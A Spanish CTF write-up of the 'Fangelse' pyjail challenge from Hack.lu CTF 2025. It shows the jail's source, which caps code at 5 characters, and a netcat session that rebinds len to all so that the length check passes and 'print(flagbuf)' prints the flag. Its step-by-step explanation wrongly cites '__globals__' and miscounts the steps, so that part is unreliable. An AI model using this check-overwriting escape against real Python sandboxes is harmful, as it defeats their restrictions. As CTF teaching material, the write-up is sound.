---
title: Fangelse - Hack.luCTF2025
author: Kesero
description: Reto basado en escapar de una pyjail mediante builtins y la función all con restricción de 5 caracteres
date: 2025-12-12 14:56:00 +0100
categories: [Writeups Competiciones Internacionales, Miscelánea]
tags: [Misc, Misc - Pyjail, Otros - Writeups, Dificultad - Fácil, Hack.luCTF]
pin: false
math: true
mermaid: true
image:
  path: https://raw.githubusercontent.com/k3sero/Blog_Content/refs/heads/main/Competiciones_Internacionales_Writeups/2025/IkeaCTF2025/Misc/Fangelse/prompt.png
  lqip: 
  alt: 
comments: true
---

Autor del reto: `Desconocido`

Dificultad: <font color=green>Fácil</font>

## Enunciado

```
Pyjail even on furniture!!
```

## Archivos

En este reto, se tienen los siguientes archivos:

- `fangelse.zip` : Contiene el docker de la infraestructura del reto.
- `nc xn--fngelse-5wa.solven.jetzt 1024` : Conexión por netcat al servidor.

Archivos utilizados en mi [repositorio de Github](https://github.com/k3sero/Blog_Content/tree/main/Competiciones_Internacionales_Writeups/2025/IkeaCTF2025/Misc/Fangelse).


## Analizando el reto

En `fangelse.py` se encuentra el siguiente código:

```py
flagbuf = open("flag.txt", "r").read()

while True:
    try:
        print(f"Side-channel: {len(flagbuf) ^ 0x1337}")
    # Just in case..
    except Exception as e:
        # print(f"Error: {e}") # don't want to leak anything
        exit(1337)
    code = input("Code: ")
    if len(code) > 5:
        print("nah")
        continue
    exec(code)
```

El código implementa una pyjail restringida en la que la `flag` se carga en memoria pero nunca se imprime. En cada iteración se filtra un `side-channel` que muestra la longitud de la flag XOR 0x1337. El usuario puede ejecutar funciones y código en Python pero limitado a 5 caracteres.

El reto consiste en encontrar una secuencia muy corta que permita escapar de la jail y acceder a `flagbuf`, aprovechando objetos ya existentes en el entorno de Python.

## Solver

El reto permitía ejecutar código Python siempre que no superara 5 caracteres. Aunque parecía muy restrictivo, Python tiene muchas formas de acceder a funciones internas usando nombres cortísimos.

La clave estaba en aprovechar que la función `all` es una *built‑in function* y que las variables pueden reasignarse con nombres de una sola letra. Con solo dos pasos podíamos obtener una función útil y finalmente imprimir la flag:

1. Asignar la función `all` a una variable corta (en 5 caracteres).
2. Usar su atributo `__globals__` para acceder al namespace global, y de ahí obtener `flagbuf`. Esto reasigna `a.__globals__` dentro de `len`, lo que nos da acceso al entorno donde está definida la variable `flagbuf`.
3. Imprimir directamente la flag.

```
┌──(kesero㉿kali)-[~]
└─$ nc xn--fngelse-5wa.solven.jetzt 1024

    Side-channel: 4890
    Code: a=all  
    Side-channel: 4890
    Code: len=a 
    Side-channel: 4918
    Code: print(flagbuf)
    flag{1_2_3_4_5_6_7_8_9_10_exploit!_12_13_...}
    Side-channel: 4918
    Code: 
```

## Flag

`flag{1_2_3_4_5_6_7_8_9_10_exploit!_12_13_...}`